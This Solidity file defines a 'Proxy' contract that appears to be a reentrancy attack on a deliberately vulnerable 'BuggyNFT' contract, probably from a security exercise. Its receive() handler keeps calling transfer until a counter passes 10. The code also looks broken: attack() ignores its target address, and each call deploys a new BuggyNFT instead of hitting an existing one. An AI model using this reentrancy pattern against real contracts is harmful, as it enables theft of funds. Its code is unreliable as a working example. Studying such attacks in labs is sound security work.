//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "./BuggyNFT.sol";


contract Proxy{


    uint256 public count = 0;


    function balance() public view returns(uint256){
        return address(this).balance;
    }

    function attack(address _address) public {
        new BuggyNFT().transfer(address(this));
    }


    
    receive() external payable {
        count++;
        if(count>10){

        }else{
            new BuggyNFT().transfer(address(this));
        }
    }
    
    fallback() external payable{

    }

}